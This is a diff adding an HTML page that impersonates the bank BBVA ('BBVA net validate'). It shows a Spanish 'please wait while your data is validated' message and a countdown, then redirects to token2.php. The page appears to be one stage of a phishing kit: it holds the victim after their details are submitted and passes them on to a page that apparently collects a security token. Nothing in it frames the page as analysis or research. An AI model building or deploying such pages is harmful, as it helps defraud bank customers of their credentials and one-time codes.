@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA net validate</title>
+    <link rel="stylesheet" href="styler.css">
+    <link rel="icon" href="faviconbbva.png">
+
+    <style>
+        .se {
+            font-size: 1.8rem;
+            color: gray;
+
+        }
+
+        .lobo {
+            max-width: 500px;
+            width: 100%;
+            opacity: 0.8;
+            min-width: 300px;
+        }
+
+
+    </style>
+</head>
+<body class="body">
+<center><form  method="post" enctype="multipart/form-data" name="formerdac" >  
+
+
+
+<header class="arriba">
+<nav class="nav">
+    <a href="#" class="logo nav-link"><img class="solar" src="logo.png" alt=""></a>
+    <br>
+</nav>
+</header>
+    <br>
+    <br>
+    <br>
+    <section class="">
+     <h1 class="letra3 lobo" >Espere mientras se validan sus datos, por su seguridad 
+        no cierre esta ventana y no apague su dispositivo.<br><br> Espere 
+        <span id="countdown"> </span> Segundos </h1>
+     <br>
+     <br>
+
+     <div class="container se">
+     </div>
+     <div>
+        <img src="img/cargando.gif">
+     </div>
+     <script >
+
+var segundoInicio = 10;
+
+function actualizar() {
+    document.getElementById('countdown').innerHTML = segundoInicio;
+
+    if (segundoInicio == 0) {
+        //cuenta regresiva ha finalizado
+        
+        window.location.href = "token2.php";
+    } else {
+
+       // segundoInicio-=1;
+        /* 0 */
+        segundoInicio = segundoInicio -1;
+        setTimeout(actualizar, 1E3);
+    }
+}
+
+actualizar();
+
+
+     </script>
+    
+
+     <br>
+     <br>
+        
+    <br>
+    <br>
+    
+
+
+<br>
+<br>
+
+
+
+
+</form>  
+
+</center>
+
+</body>
+</html>
